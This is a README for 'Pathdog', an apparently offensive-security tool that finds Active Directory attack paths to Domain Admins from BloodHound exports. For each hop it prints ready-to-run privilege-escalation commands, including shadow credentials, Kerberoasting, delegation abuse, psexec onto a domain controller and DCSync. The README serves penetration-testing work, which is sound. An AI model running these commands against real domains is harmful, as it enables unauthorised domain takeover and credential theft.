# Pathdog

BloodHound attack path analyzer — finds paths from owned users to Domain Admin **without Neo4j or any GUI dependency**.

For each hop in a path, Pathdog outputs the exact commands to exploit that relationship (impacket, evil-winrm, bloodyAD, pywhisker, certipy, etc.).

---

## Install

```bash
pip install -r requirements.txt
```

Python 3.10+ required.

---

## Usage

```
usage: pathdog [-h] -z FILE [-z FILE ...] -u USER [-u USER ...] [-t TARGET]
               [-k K] [-o BASENAME] [-f {md,html,both}] [-v]

arguments:
  -z / --zip       BloodHound ZIP export — repeat to merge multiple dumps
  -u / --user      Owned user identity — repeat for multiple owned users
  -t / --target    Target node (default: auto-detect DOMAIN ADMINS)
  -k / --paths     Number of paths to find per user (default: 3)
  -o / --output    Output file base name (default: pathdog_report)
  -f / --format    Output format: md, html, or both (default: both)
  -v / --verbose   Show graph stats (total nodes, pruned nodes, edges)
```

---

## Examples

**Basic scan — one owned user, one ZIP:**
```bash
python pathdog.py -z corp_bloodhound.zip -u john.doe@corp.local
```

**Two owned users, two ZIPs merged into one graph:**
```bash
python pathdog.py -z dump1.zip -z dump2.zip -u john.doe@corp.local -u svc_backup@corp.local
```

**5 paths, HTML only, verbose stats:**
```bash
python pathdog.py -z megacorp_dump.zip -u svc_backup@megacorp.local -k 5 -f html -v -o megacorp_report
```

**Explicit target, Markdown only:**
```bash
python pathdog.py -z acme_export.zip -u alice@acme.local -t "DOMAIN ADMINS@acme.local" -f md -o acme_paths
```

---

## Multiple ZIPs and multiple owned users

When you provide several `-z` flags, Pathdog **merges all dumps into a single graph** before analysis. Duplicate nodes and edges are deduplicated automatically (lowest weight edge is kept).

When you provide several `-u` flags, Pathdog computes paths independently for each owned user **within the same merged graph**. This means a chain like:

```
userA ──[AddSelf]──► GROUP_X ──[GenericWrite]──► userB ──[DCSync]──► DOMAIN ADMINS
```

is found in a single pass even if `userA` and `userB` came from different ZIPs — because both users share the same graph after the merge.

**Typical multi-user workflow:**
```bash
# Collect two BloodHound dumps (e.g. from two different machines)
python pathdog.py \
  -z bloodhound_ws01.zip \
  -z bloodhound_ws02.zip \
  -u alice@corp.local \
  -u bob@corp.local \
  -k 5 -f html -v -o full_report
```

---

## Why this finds paths that BloodHound GUI misses

BloodHound's built-in Cypher queries (`shortestPath`, `allShortestPaths`) operate on Neo4j with a **default depth limit** (typically 20 hops in the UI, often lower in custom queries). This limit silently truncates long paths.

Pathdog uses **NetworkX's `shortest_simple_paths`** (Yen's K-shortest algorithm) on a locally-built graph — **no hop limit**. The ancestor-pruning step first reduces the graph to only nodes that can reach DA, so even very large dumps process quickly.

---

## Exploit commands

For every hop in a found path, Pathdog outputs ready-to-run commands with placeholders for credentials:

```
john.doe@corp.local
  └─[GenericWrite]────────────────────────► svc_backup@corp.local
     ↳ Generic write on svc_backup — write SPN (Kerberoast) or shadow credentials.
       $ pywhisker -d corp.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add
       $ bloodyAD --host <DC_IP> -d corp.local -u 'john.doe' -p '<SRC_PASSWORD>' set object 'svc_backup' servicePrincipalName -v 'fake/blah'
       $ impacket-GetUserSPNs 'corp.local/john.doe:<SRC_PASSWORD>' -dc-ip <DC_IP> -request
       $ hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt
  └─[AllowedToDelegate]───────────────────► DC01.corp.local
     ↳ Constrained delegation — impersonate Administrator on DC01.corp.local.
       $ impacket-getST -spn 'cifs/DC01.corp.local' -impersonate 'Administrator' 'corp.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
       $ export KRB5CCNAME=Administrator@cifs_DC01.ccache
       $ impacket-psexec -k -no-pass 'corp.local/Administrator@DC01.corp.local'
```

Replace `<SRC_PASSWORD>`, `<NTLM_HASH>`, and `<DC_IP>` with your actual values.

---

## Supported BloodHound edge types

| Edge | Weight | Exploit approach |
|------|--------|-----------------|
| MemberOf | 1 | Passive — already a member |
| Contains | 1 | Passive — structural |
| GenericAll | 2 | Password reset / AddMember / shadow creds |
| DCSync | 2 | `impacket-secretsdump` |
| GetChangesAll | 2 | DCSync combo → `secretsdump` |
| AllExtendedRights | 2 | Password reset or DCSync |
| AddMember | 2 | `net rpc group addmem` / `bloodyAD` |
| ReadLAPSPassword | 2 | `GetLAPSPassword` / `pyLAPS` |
| SyncLAPSPassword | 2 | `GetLAPSPassword` / `pyLAPS` |
| AddSelf | 2 | `net rpc group addmem` (self) |
| AdminTo | 2 | `psexec` / `wmiexec` / `evil-winrm` |
| GPLink | 2 | `pygpoabuse` / `SharpGPOAbuse` |
| WriteDacl | 3 | `dacledit.py` → grant GenericAll |
| WriteOwner | 3 | `owneredit.py` + `dacledit.py` |
| GenericWrite | 3 | Shadow creds (`pywhisker`) or WriteSPN + Kerberoast |
| Owns | 3 | `owneredit.py` + `dacledit.py` |
| ForceChangePassword | 3 | `net rpc password` / `bloodyAD` |
| CanRDP | 3 | `xfreerdp` |
| CanPSRemote | 3 | `evil-winrm` |
| ExecuteDCOM | 3 | `impacket-dcomexec` |
| SQLAdmin | 3 | `impacket-mssqlclient` + `xp_cmdshell` |
| WriteSPN | 3 | Set fake SPN → `GetUserSPNs` → `hashcat` |
| TrustedBy | 3 | Golden ticket + extra SID |
| AllowedToDelegate | 4 | `getST -impersonate Administrator` |
| HasSession | 4 | Connect + Mimikatz / Rubeus token steal |
| WriteAccountRestrictions | 4 | RBCD (`rbcd.py` → `getST`) |
| AddKeyCredentialLink | 4 | Shadow creds (`pywhisker` → `gettgtpkinit`) |
| AllowedToAct | 5 | RBCD (`addcomputer` → `rbcd.py` → `getST`) |
| *(unknown)* | 5 | Consult BloodHound documentation |

---

## Report output

### Console
Inline exploit commands after each hop.

### HTML
Standalone dark-theme single-file HTML. Multi-user mode generates one section per owned user.

### Markdown
GitBook-compatible with tables, code blocks, and per-hop exploit steps.

---

## Project structure

```
pathdog/
├── pathdog/
│   ├── __init__.py
│   ├── loader.py       # ZIP parsing → nodes/edges
│   ├── graph.py        # NetworkX DiGraph builder + pruning
│   ├── weights.py      # Edge weight table
│   ├── pathfinder.py   # Path computation logic
│   ├── commands.py     # Exploit command templates per edge type
│   └── report.py       # Markdown + HTML report renderer
├── pathdog.py          # CLI entrypoint
├── requirements.txt
└── README.md
```
